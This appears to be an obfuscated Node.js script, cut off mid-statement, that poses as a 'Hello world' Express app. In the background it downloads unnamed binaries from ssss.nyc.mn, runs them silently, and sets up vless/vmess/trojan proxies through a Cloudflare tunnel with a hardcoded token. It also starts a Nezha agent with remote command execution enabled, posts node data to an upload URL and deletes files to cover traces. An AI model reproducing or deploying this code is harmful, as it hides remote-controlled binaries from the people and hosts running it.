const _0x27e989=_0x101d;(function(_0x56df08,_0x41de22){const _0x5220c6={_0x49ba40:0x17e,_0x1e0fbd:0x1e2,_0x123988:0x17f,_0x594880:0x21c,_0x734276:0x193,_0x332a08:0x1d0,_0x48b1ef:0x181},_0x535320=_0x101d,_0x257605=_0x56df08();while(!![]){try{const _0x2a4f58=parseInt(_0x535320(_0x5220c6._0x49ba40))/0x1*(parseInt(_0x535320(_0x5220c6._0x1e0fbd))/0x2)+-parseInt(_0x535320(_0x5220c6._0x123988))/0x3+-parseInt(_0x535320(0x207))/0x4+-parseInt(_0x535320(_0x5220c6._0x594880))/0x5*(-parseInt(_0x535320(_0x5220c6._0x734276))/0x6)+-parseInt(_0x535320(0x1e3))/0x7*(-parseInt(_0x535320(_0x5220c6._0x332a08))/0x8)+parseInt(_0x535320(0x1f8))/0x9+-parseInt(_0x535320(0x1fd))/0xa*(parseInt(_0x535320(_0x5220c6._0x48b1ef))/0xb);if(_0x2a4f58===_0x41de22)break;else _0x257605['push'](_0x257605['shift']());}catch(_0x33cd79){_0x257605['push'](_0x257605['shift']());}}}(_0x1a10,0xb9631));const express=require(_0x27e989(0x218)),app=express(),axios=require(_0x27e989(0x202)),os=require('os'),fs=require('fs'),path=require(_0x27e989(0x225)),{promisify}=require(_0x27e989(0x1af)),exec=promisify(require('child_process')[_0x27e989(0x224)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x27e989(0x1cb)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x27e989(0x1cb)][_0x27e989(0x1c8)]||'',AUTO_ACCESS=process[_0x27e989(0x1cb)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x27e989(0x1cb)][_0x27e989(0x1dd)]||_0x27e989(0x1b3),SUB_PATH=process['env']['SUB_PATH']||_0x27e989(0x215),PORT=process[_0x27e989(0x1cb)][_0x27e989(0x1fa)]||process[_0x27e989(0x1cb)][_0x27e989(0x201)]||0xbb8,UUID=process['env'][_0x27e989(0x18f)]||_0x27e989(0x20e),NEZHA_SERVER=process['env'][_0x27e989(0x1a3)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x27e989(0x1cb)][_0x27e989(0x228)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x27e989(0x22b),ARGO_AUTH=process[_0x27e989(0x1cb)]['ARGO_AUTH']||_0x27e989(0x1ac),ARGO_PORT=process[_0x27e989(0x1cb)][_0x27e989(0x1a2)]||0x1f41,CFIP=process['env']['CFIP']||_0x27e989(0x1ed),CFPORT=process[_0x27e989(0x1cb)][_0x27e989(0x1c4)]||0x1bb,NAME=process['env'][_0x27e989(0x17a)]||_0x27e989(0x186);function _0x101d(_0x481a46,_0x1c5db3){const _0x1a10fb=_0x1a10();return _0x101d=function(_0x101d09,_0x38b9cc){_0x101d09=_0x101d09-0x17a;let _0x3a1a36=_0x1a10fb[_0x101d09];return _0x3a1a36;},_0x101d(_0x481a46,_0x1c5db3);}!fs[_0x27e989(0x1d1)](FILE_PATH)?(fs[_0x27e989(0x20b)](FILE_PATH),console['log'](FILE_PATH+_0x27e989(0x1d4))):console[_0x27e989(0x21e)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4b20fb={_0x65b8b9:0x213,_0xa077e1:0x20a,_0x521da6:0x20f,_0x275cbe:0x1c2},_0xb479fe=_0x27e989,_0x335f88=_0xb479fe(0x196);let _0x2008a3='';for(let _0x5750c9=0x0;_0x5750c9<0x6;_0x5750c9++){_0x2008a3+=_0x335f88[_0xb479fe(_0x4b20fb._0x65b8b9)](Math[_0xb479fe(_0x4b20fb._0xa077e1)](Math[_0xb479fe(_0x4b20fb._0x521da6)]()*_0x335f88[_0xb479fe(_0x4b20fb._0x275cbe)]));}return _0x2008a3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x27e989(0x1ee)](FILE_PATH,npmName),phpPath=path[_0x27e989(0x1ee)](FILE_PATH,phpName),webPath=path[_0x27e989(0x1ee)](FILE_PATH,webName),botPath=path[_0x27e989(0x1ee)](FILE_PATH,botName),subPath=path[_0x27e989(0x1ee)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x27e989(0x208)),bootLogPath=path['join'](FILE_PATH,_0x27e989(0x21a)),configPath=path[_0x27e989(0x1ee)](FILE_PATH,_0x27e989(0x1b4));function deleteNodes(){const _0x2a5bc1={_0x3a588f:0x189,_0x35065a:0x235,_0x402083:0x1c2,_0x361818:0x1f9,_0x1309ed:0x1b6},_0x4a44bf=_0x27e989;try{if(!UPLOAD_URL)return;if(!fs[_0x4a44bf(0x1d1)](subPath))return;let _0x8cb105;try{_0x8cb105=fs[_0x4a44bf(_0x2a5bc1._0x3a588f)](subPath,_0x4a44bf(0x217));}catch{return null;}const _0x4bb24c=Buffer[_0x4a44bf(0x229)](_0x8cb105,_0x4a44bf(_0x2a5bc1._0x35065a))[_0x4a44bf(0x20c)](_0x4a44bf(0x217)),_0x13fed1=_0x4bb24c[_0x4a44bf(0x1e4)]('\x0a')['filter'](_0x2d7f8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4a44bf(0x200)](_0x2d7f8));if(_0x13fed1[_0x4a44bf(_0x2a5bc1._0x402083)]===0x0)return;return axios[_0x4a44bf(_0x2a5bc1._0x361818)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x13fed1}),{'headers':{'Content-Type':_0x4a44bf(_0x2a5bc1._0x1309ed)}})['catch'](_0x19d2f7=>{return null;}),null;}catch(_0x5eb741){return null;}}function cleanupOldFiles(){const _0x1cade6={_0x2f68ca:0x1ea},_0x4e89e5=_0x27e989;try{const _0x585598=fs[_0x4e89e5(0x188)](FILE_PATH);_0x585598[_0x4e89e5(0x1a6)](_0x567f7b=>{const _0x36b66e=_0x4e89e5,_0x1917f7=path[_0x36b66e(0x1ee)](FILE_PATH,_0x567f7b);try{const _0x1893f9=fs[_0x36b66e(0x195)](_0x1917f7);_0x1893f9['isFile']()&&fs[_0x36b66e(_0x1cade6._0x2f68ca)](_0x1917f7);}catch(_0x1bff9e){}});}catch(_0x53a680){}}app[_0x27e989(0x1f4)]('/',function(_0x33377a,_0x27ad8e){const _0x450c74=_0x27e989;_0x27ad8e[_0x450c74(0x1e1)]('Hello\x20world!');});async function generateConfig(){const _0x77b815={_0x884319:0x230,_0x571fd3:0x1cc,_0x57a62c:0x1ff,_0x33f584:0x1f1,_0x53ea58:0x1fb,_0x2d3074:0x1e8,_0x3f011d:0x1cc,_0x2030e3:0x1e8,_0x275bb3:0x1ff,_0x2da462:0x20d,_0x92df9e:0x1cc,_0x400279:0x1a5,_0x5df12b:0x1c0,_0x4fb6ed:0x190,_0x3cacf4:0x1fb,_0x4f647e:0x1a5,_0x3dc6b6:0x1a5,_0xcbd3cb:0x1df,_0x366a5e:0x1b4},_0x2c3191=_0x27e989,_0x236b02={'log':{'access':_0x2c3191(0x230),'error':_0x2c3191(_0x77b815._0x884319),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2c3191(_0x77b815._0x571fd3),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2c3191(_0x77b815._0x57a62c),'fallbacks':[{'dest':0xbb9},{'path':_0x2c3191(_0x77b815._0x33f584),'dest':0xbba},{'path':_0x2c3191(_0x77b815._0x53ea58),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2c3191(_0x77b815._0x2d3074)}},{'port':0xbb9,'listen':_0x2c3191(0x20d),'protocol':_0x2c3191(_0x77b815._0x3f011d),'settings':{'clients':[{'id':UUID}],'decryption':_0x2c3191(_0x77b815._0x57a62c)},'streamSettings':{'network':_0x2c3191(_0x77b815._0x2030e3),'security':_0x2c3191(_0x77b815._0x275bb3)}},{'port':0xbba,'listen':_0x2c3191(_0x77b815._0x2da462),'protocol':_0x2c3191(_0x77b815._0x92df9e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2c3191(0x1ff)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2c3191(_0x77b815._0x400279),_0x2c3191(_0x77b815._0x5df12b),_0x2c3191(_0x77b815._0x4fb6ed)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2c3191(_0x77b815._0x2da462),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2c3191(_0x77b815._0x3cacf4)}},'sniffing':{'enabled':!![],'destOverride':[_0x2c3191(_0x77b815._0x4f647e),_0x2c3191(0x1c0),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2c3191(0x20d),'protocol':_0x2c3191(0x1ef),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2c3191(0x1c7)}},'sniffing':{'enabled':!![],'destOverride':[_0x2c3191(_0x77b815._0x3dc6b6),_0x2c3191(0x1c0),_0x2c3191(0x190)],'metadataOnly':![]}}],'dns':{'servers':[_0x2c3191(_0x77b815._0xcbd3cb)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x2c3191(0x19a),'tag':_0x2c3191(0x1da)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2c3191(_0x77b815._0x366a5e)),JSON[_0x2c3191(0x1f5)](_0x236b02,null,0x2));}function getSystemArchitecture(){const _0x3796fb={_0x56de1d:0x1d5,_0x408b3f:0x22e},_0x35168d=_0x27e989,_0x43b297=os['arch']();return _0x43b297==='arm'||_0x43b297==='arm64'||_0x43b297===_0x35168d(_0x3796fb._0x56de1d)?_0x35168d(_0x3796fb._0x408b3f):_0x35168d(0x17c);}function _0x1a10(){const _0x22d4fe=['http://ip-api.com/json/','FILE_PATH','finish','https+local://8.8.8.8/dns-query','data','send','136610ZXSHJu','7ROnsMZ','split','https://amd64.ssss.nyc.mn/v1','/api/add-subscriptions','match','tcp','\x20>/dev/null\x202>&1','unlinkSync','then','\x0a\x0avmess://','cdns.doon.eu.org','join','trojan','https://arm64.ssss.nyc.mn/bot','/vless-argo','2096','Error\x20in\x20startserver:','get','stringify','.exe\x20>\x20nul\x202>&1','php\x20running\x20error:\x20','5307660oHAaDP','post','SERVER_PORT','/vmess-argo','chmod','21380YXIsyj','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','test','PORT','axios','Empowerment\x20failed\x20for\x20','Subscription\x20uploaded\x20successfully','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','3535572vNrUCS','list.txt','all','floor','mkdirSync','toString','127.0.0.1','bce9a709-723f-4333-9982-aff1145610eb','random','tunnel.json','status','catch','charAt','\x20-c\x20\x22','edit','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf-8','express','response','boot.log','https://amd64.ssss.nyc.mn/bot','320675rGFTJQ','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','log','message','\x20failed:\x20','rm\x20-rf\x20','2053','unlink','exec','path','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x20\x20credentials-file:\x20','NEZHA_KEY','from','Download\x20','lee.zaya3.de5.net','2083','Unhandled\x20error\x20in\x20startserver:','arm','fileUrl','/dev/null','&fp=firefox&type=ws&host=','https://ipapi.co/json/','\x20is\x20running','web\x20running\x20error:\x20','base64','NAME','\x0avless://','amd','org','11HPUzMV','2100507KuIcyW','\x0a\x20\x20tunnel:\x20','5819xXBygC','8443','Empowerment\x20success\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x20\x20','leaflow','https://arm64.ssss.nyc.mn/v1','readdirSync','readFileSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2087','http\x20server\x20is\x20running\x20on\x20port:','https://amd64.ssss.nyc.mn/agent','UUID','quic','https://oooo.serv00.net/add-url','win32','78cKFCOr','createWriteStream','statSync','abcdefghijklmnopqrstuvwxyz','substring','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20>\x20nul\x202>&1','blackhole','true','Error\x20downloading\x20files:','/sub.txt\x20saved\x20successfully','success','countryCode','Error\x20executing\x20command:\x20','/vmess-argo?ed=2560','ARGO_PORT','NEZHA_SERVER','\x20-p\x20','http','forEach','\x20>/dev/null\x202>&1\x20&','map','https://arm64.ssss.nyc.mn/web','tunnel.yml','false','eyJhIjoiNDJkNWJmMzVhZmYwMTY4NWU3YWIxMjRmOGRlZWUwNjkiLCJ0IjoiODY0ZjZkMjQtMjY3Mi00NGFmLTlkNWItYjVkZjdiNmVkNDk1IiwicyI6IlpURmxNV1ZrT0RZdFpUZGpZeTAwTWpGaExXRTNNak10TkRSak5HUmhNV1JsWkRnNCJ9','automatic\x20access\x20task\x20added\x20successfully','\x20-s\x20','util','basename','443','country_code','./tmp','config.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','application/json','nohup\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','push','App\x20is\x20running','includes','?encryption=none&security=tls&sni=','config.yaml','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tls','writeFileSync','length','fileName','CFPORT','Add\x20automatic\x20access\x20task\x20faild:\x20','del\x20/f\x20/q\x20','/trojan-argo','PROJECT_URL','&path=%2Fvless-argo%3Fed%3D2560#','npm\x20running\x20error:\x20','env','vless','error','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','10396472JdfuVc','existsSync','/tunnel.yml\x20run','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20is\x20created','aarch64','pop','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-c\x20','block','clear'];_0x1a10=function(){return _0x22d4fe;};return _0x1a10();}function downloadFile(_0x47d25b,_0x17365b,_0x367fc8){const _0x395b70={_0x301a04:0x1d1,_0x291a6d:0x194,_0x4f5b3c:0x212},_0x1c32fb={_0x20cd9f:0x22a,_0x23eaf6:0x220},_0x1b9b63={_0x46f536:0x1e0,_0x54dbf2:0x1de},_0x1b6a59={_0x3fb24d:0x223,_0x1e8694:0x1b0},_0x119295=_0x27e989,_0x2768ec=_0x47d25b;!fs[_0x119295(_0x395b70._0x301a04)](FILE_PATH)&&fs[_0x119295(0x20b)](FILE_PATH,{'recursive':!![]});const _0x125b42=fs[_0x119295(_0x395b70._0x291a6d)](_0x2768ec);axios({'method':_0x119295(0x1f4),'url':_0x17365b,'responseType':'stream'})[_0x119295(0x1eb)](_0x29f05b=>{const _0x2c26f2=_0x119295;_0x29f05b[_0x2c26f2(_0x1b9b63._0x46f536)]['pipe'](_0x125b42),_0x125b42['on'](_0x2c26f2(_0x1b9b63._0x54dbf2),()=>{const _0x4c2579=_0x2c26f2;_0x125b42['close'](),console['log'](_0x4c2579(0x22a)+path[_0x4c2579(0x1b0)](_0x2768ec)+'\x20successfully'),_0x367fc8(null,_0x2768ec);}),_0x125b42['on']('error',_0x33fee8=>{const _0x407ff4=_0x2c26f2;fs[_0x407ff4(_0x1b6a59._0x3fb24d)](_0x2768ec,()=>{});const _0x814472=_0x407ff4(0x22a)+path[_0x407ff4(_0x1b6a59._0x1e8694)](_0x2768ec)+_0x407ff4(0x220)+_0x33fee8[_0x407ff4(0x21f)];console['error'](_0x814472),_0x367fc8(_0x814472);});})[_0x119295(_0x395b70._0x4f5b3c)](_0x59e615=>{const _0x12e251=_0x119295,_0x13a835=_0x12e251(_0x1c32fb._0x20cd9f)+path['basename'](_0x2768ec)+_0x12e251(_0x1c32fb._0x23eaf6)+_0x59e615[_0x12e251(0x21f)];console[_0x12e251(0x1cd)](_0x13a835),_0x367fc8(_0x13a835);});}async function downloadFilesAndRun(){const _0x350d82={_0x2eed00:0x198,_0xa5bcb4:0x1a8,_0x39be4a:0x1cd,_0x135b38:0x19c,_0x522946:0x1bb,_0x26bce6:0x1e4,_0x344463:0x1d6,_0x1eb930:0x182,_0x4693e6:0x18c,_0x491692:0x222,_0x374820:0x19b,_0x112565:0x1d3,_0x2ab352:0x1ee,_0x3910ea:0x214,_0x1e2b06:0x206,_0x238427:0x21e,_0x55b7c3:0x18c,_0x520f6c:0x1a4,_0x2d168d:0x18b,_0xc06a54:0x1d9,_0x11f1cd:0x233,_0x4eaa72:0x234,_0x268e06:0x1d1,_0x213cf9:0x1d2,_0x296c38:0x1b7,_0x178370:0x233},_0x1b9672={_0x5c48b8:0x1fc},_0x23bf48=_0x27e989,_0x4ed658=getSystemArchitecture(),_0x195b18=getFilesForArchitecture(_0x4ed658);if(_0x195b18[_0x23bf48(0x1c2)]===0x0){console[_0x23bf48(0x21e)](_0x23bf48(_0x350d82._0x2eed00));return;}const _0x394c3c=_0x195b18[_0x23bf48(_0x350d82._0xa5bcb4)](_0x46da22=>{const _0x5d484b={_0x3e977d:0x1c3,_0x1af71c:0x22f};return new Promise((_0x28f026,_0x5d4829)=>{const _0x15c6f3=_0x101d;downloadFile(_0x46da22[_0x15c6f3(_0x5d484b._0x3e977d)],_0x46da22[_0x15c6f3(_0x5d484b._0x1af71c)],(_0x28c02d,_0x2700df)=>{_0x28c02d?_0x5d4829(_0x28c02d):_0x28f026(_0x2700df);});});});try{await Promise[_0x23bf48(0x209)](_0x394c3c);}catch(_0x368220){console[_0x23bf48(_0x350d82._0x39be4a)](_0x23bf48(_0x350d82._0x135b38),_0x368220);return;}function _0x1b3a8d(_0x3803e0){const _0x3ae337=_0x23bf48,_0x4afef4=0x1fd;_0x3803e0[_0x3ae337(0x1a6)](_0x179f35=>{const _0x40dc2a=_0x3ae337;fs['existsSync'](_0x179f35)&&fs[_0x40dc2a(_0x1b9672._0x5c48b8)](_0x179f35,_0x4afef4,_0x5b8ed6=>{const _0xe52a6a=_0x40dc2a;_0x5b8ed6?console[_0xe52a6a(0x1cd)](_0xe52a6a(0x203)+_0x179f35+':\x20'+_0x5b8ed6):console['log'](_0xe52a6a(0x183)+_0x179f35+':\x20'+_0x4afef4[_0xe52a6a(0x20c)](0x8));});});}const _0x39ed70=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1b3a8d(_0x39ed70);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12f5cc=NEZHA_SERVER[_0x23bf48(_0x350d82._0x522946)](':')?NEZHA_SERVER[_0x23bf48(_0x350d82._0x26bce6)](':')[_0x23bf48(_0x350d82._0x344463)]():'',_0x1847d3=new Set([_0x23bf48(0x1b1),_0x23bf48(_0x350d82._0x1eb930),'2096',_0x23bf48(_0x350d82._0x4693e6),_0x23bf48(0x22c),_0x23bf48(_0x350d82._0x491692)]),_0x5dc5bc=_0x1847d3['has'](_0x12f5cc)?_0x23bf48(_0x350d82._0x374820):_0x23bf48(0x1ab),_0x564bb8='\x0aclient_secret:\x20'+NEZHA_KEY+_0x23bf48(0x216)+NEZHA_SERVER+_0x23bf48(_0x350d82._0x112565)+_0x5dc5bc+_0x23bf48(0x1b8)+UUID;fs['writeFileSync'](path[_0x23bf48(_0x350d82._0x2ab352)](FILE_PATH,_0x23bf48(0x1bd)),_0x564bb8);const _0x54ff05=_0x23bf48(0x1b7)+phpPath+_0x23bf48(_0x350d82._0x3910ea)+FILE_PATH+_0x23bf48(_0x350d82._0x1e2b06);try{await exec(_0x54ff05),console[_0x23bf48(_0x350d82._0x238427)](phpName+'\x20is\x20running'),await new Promise(_0x50fc72=>setTimeout(_0x50fc72,0x3e8));}catch(_0x51820e){console[_0x23bf48(_0x350d82._0x39be4a)](_0x23bf48(0x1f7)+_0x51820e);}}else{let _0x277083='';const _0x4aa8e4=[_0x23bf48(0x1b1),_0x23bf48(0x182),_0x23bf48(0x1f2),_0x23bf48(_0x350d82._0x55b7c3),'2083',_0x23bf48(0x222)];_0x4aa8e4[_0x23bf48(0x1bb)](NEZHA_PORT)&&(_0x277083='--tls');const _0x27775f=_0x23bf48(0x1b7)+npmPath+_0x23bf48(0x1ae)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23bf48(_0x350d82._0x520f6c)+NEZHA_KEY+'\x20'+_0x277083+_0x23bf48(_0x350d82._0x2d168d);try{await exec(_0x27775f),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x3b46fa=>setTimeout(_0x3b46fa,0x3e8));}catch(_0x42eba7){console['error'](_0x23bf48(0x1ca)+_0x42eba7);}}}else console['log'](_0x23bf48(0x226));const _0xc8f8b3='nohup\x20'+webPath+_0x23bf48(_0x350d82._0xc06a54)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xc8f8b3),console['log'](webName+_0x23bf48(_0x350d82._0x11f1cd)),await new Promise(_0x418c89=>setTimeout(_0x418c89,0x3e8));}catch(_0x3db8fb){console['error'](_0x23bf48(_0x350d82._0x4eaa72)+_0x3db8fb);}if(fs[_0x23bf48(_0x350d82._0x268e06)](botPath)){let _0x722bca;if(ARGO_AUTH[_0x23bf48(0x1e7)](/^[A-Z0-9a-z=]{120,250}$/))_0x722bca=_0x23bf48(0x21d)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x722bca='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x23bf48(_0x350d82._0x213cf9):_0x722bca=_0x23bf48(0x1b5)+FILE_PATH+_0x23bf48(0x1d8)+ARGO_PORT;try{await exec(_0x23bf48(_0x350d82._0x296c38)+botPath+'\x20'+_0x722bca+_0x23bf48(0x1a7)),console[_0x23bf48(_0x350d82._0x238427)](botName+_0x23bf48(_0x350d82._0x178370)),await new Promise(_0x24d760=>setTimeout(_0x24d760,0x7d0));}catch(_0x3f29d2){console['error']('Error\x20executing\x20command:\x20'+_0x3f29d2);}}await new Promise(_0x11972d=>setTimeout(_0x11972d,0x1388));}function getFilesForArchitecture(_0x4559b1){const _0x2fd9f1={_0x7c27a7:0x1a9,_0xba89e4:0x1f0,_0x2d8f67:0x187},_0x528a0d=_0x27e989;let _0x5ee8d2;_0x4559b1===_0x528a0d(0x22e)?_0x5ee8d2=[{'fileName':webPath,'fileUrl':_0x528a0d(_0x2fd9f1._0x7c27a7)},{'fileName':botPath,'fileUrl':_0x528a0d(_0x2fd9f1._0xba89e4)}]:_0x5ee8d2=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x528a0d(0x21b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x52eafa=_0x4559b1===_0x528a0d(0x22e)?'https://arm64.ssss.nyc.mn/agent':_0x528a0d(0x18e);_0x5ee8d2[_0x528a0d(0x205)]({'fileName':npmPath,'fileUrl':_0x52eafa});}else{const _0x475ef9=_0x4559b1===_0x528a0d(0x22e)?_0x528a0d(_0x2fd9f1._0x2d8f67):_0x528a0d(0x1e5);_0x5ee8d2['unshift']({'fileName':phpPath,'fileUrl':_0x475ef9});}}return _0x5ee8d2;}function argoType(){const _0x5e0f77={_0xdfb7a:0x210,_0x17d25c:0x180,_0x279ab9:0x1e4,_0x940a32:0x227,_0x41ced0:0x210,_0x460983:0x184,_0x27bd4b:0x1bf,_0x4e4b5a:0x1c1,_0x4b9e4c:0x1ee,_0x2869d:0x1fe},_0x56c97b=_0x27e989;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x56c97b(0x21e)](_0x56c97b(0x1d7));return;}if(ARGO_AUTH[_0x56c97b(0x1bb)](_0x56c97b(0x1ce))){fs[_0x56c97b(0x1c1)](path[_0x56c97b(0x1ee)](FILE_PATH,_0x56c97b(_0x5e0f77._0xdfb7a)),ARGO_AUTH);const _0x16af5f=_0x56c97b(_0x5e0f77._0x17d25c)+ARGO_AUTH[_0x56c97b(_0x5e0f77._0x279ab9)]('\x22')[0xb]+_0x56c97b(_0x5e0f77._0x940a32)+path[_0x56c97b(0x1ee)](FILE_PATH,_0x56c97b(_0x5e0f77._0x41ced0))+_0x56c97b(_0x5e0f77._0x460983)+ARGO_DOMAIN+_0x56c97b(_0x5e0f77._0x27bd4b)+ARGO_PORT+_0x56c97b(0x1cf);fs[_0x56c97b(_0x5e0f77._0x4e4b5a)](path[_0x56c97b(_0x5e0f77._0x4b9e4c)](FILE_PATH,_0x56c97b(0x1aa)),_0x16af5f);}else console['log'](_0x56c97b(_0x5e0f77._0x2869d));}async function extractDomains(){const _0x55283d={_0x24b2f1:0x1ee,_0xb92869:0x21e,_0x58f415:0x1ea,_0x1bd4e0:0x1b5,_0x1e2dae:0x1d8},_0x56145f={_0x4d6523:0x1e0,_0x36c210:0x17d,_0x17a55f:0x1b2,_0xf7a768:0x1dc,_0x1ae151:0x19e,_0x1c3662:0x1e0,_0x39e670:0x17d},_0x44296e={_0x111147:0x213},_0x2eb667=_0x27e989;let _0x5452b4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5452b4=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x5452b4),await _0x396c0e(_0x5452b4);else try{const _0x516aaf=fs[_0x2eb667(0x189)](path[_0x2eb667(_0x55283d._0x24b2f1)](FILE_PATH,_0x2eb667(0x21a)),_0x2eb667(0x217)),_0x50d4fc=_0x516aaf[_0x2eb667(0x1e4)]('\x0a'),_0x28fcbc=[];_0x50d4fc[_0x2eb667(0x1a6)](_0x46003b=>{const _0x1b385a=_0x2eb667,_0x5e0927=_0x46003b[_0x1b385a(0x1e7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5e0927){const _0x16fba8=_0x5e0927[0x1];_0x28fcbc[_0x1b385a(0x1b9)](_0x16fba8);}});if(_0x28fcbc['length']>0x0)_0x5452b4=_0x28fcbc[0x0],console[_0x2eb667(_0x55283d._0xb92869)]('ArgoDomain:',_0x5452b4),await _0x396c0e(_0x5452b4);else{console[_0x2eb667(0x21e)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2eb667(_0x55283d._0x58f415)](path[_0x2eb667(_0x55283d._0x24b2f1)](FILE_PATH,'boot.log'));async function _0xd3d404(){const _0x4be786=_0x2eb667;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x4be786(0x1f6)):await exec('pkill\x20-f\x20\x22['+botName[_0x4be786(_0x44296e._0x111147)](0x0)+']'+botName[_0x4be786(0x197)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x516685){}}_0xd3d404(),await new Promise(_0x30a45a=>setTimeout(_0x30a45a,0xbb8));const _0x319500=_0x2eb667(_0x55283d._0x1bd4e0)+FILE_PATH+_0x2eb667(_0x55283d._0x1e2dae)+ARGO_PORT;try{await exec(_0x2eb667(0x1b7)+botPath+'\x20'+_0x319500+'\x20>/dev/null\x202>&1\x20&'),console[_0x2eb667(0x21e)](botName+_0x2eb667(0x233)),await new Promise(_0x4f27e2=>setTimeout(_0x4f27e2,0xbb8)),await extractDomains();}catch(_0x3e28e2){console[_0x2eb667(0x1cd)](_0x2eb667(0x1a0)+_0x3e28e2);}}}catch(_0x307a35){console['error']('Error\x20reading\x20boot.log:',_0x307a35);}async function _0x51a16a(){const _0x27ecc2=_0x2eb667;try{const _0x243ac5=await axios['get'](_0x27ecc2(0x232),{'timeout':0xbb8});if(_0x243ac5[_0x27ecc2(_0x56145f._0x4d6523)]&&_0x243ac5['data']['country_code']&&_0x243ac5[_0x27ecc2(0x1e0)][_0x27ecc2(_0x56145f._0x36c210)])return _0x243ac5[_0x27ecc2(0x1e0)][_0x27ecc2(_0x56145f._0x17a55f)]+'_'+_0x243ac5[_0x27ecc2(0x1e0)][_0x27ecc2(0x17d)];}catch(_0x458087){try{const _0xdf198f=await axios['get'](_0x27ecc2(_0x56145f._0xf7a768),{'timeout':0xbb8});if(_0xdf198f[_0x27ecc2(_0x56145f._0x4d6523)]&&_0xdf198f[_0x27ecc2(_0x56145f._0x4d6523)][_0x27ecc2(0x211)]===_0x27ecc2(_0x56145f._0x1ae151)&&_0xdf198f[_0x27ecc2(_0x56145f._0x4d6523)][_0x27ecc2(0x19f)]&&_0xdf198f[_0x27ecc2(0x1e0)]['org'])return _0xdf198f[_0x27ecc2(_0x56145f._0x1c3662)]['countryCode']+'_'+_0xdf198f['data'][_0x27ecc2(_0x56145f._0x39e670)];}catch(_0x29c82f){}}return'Unknown';}async function _0x396c0e(_0x33a636){const _0x2b3a36=await _0x51a16a(),_0x443102=NAME?NAME+'-'+_0x2b3a36:_0x2b3a36;return new Promise(_0x36d4b8=>{const 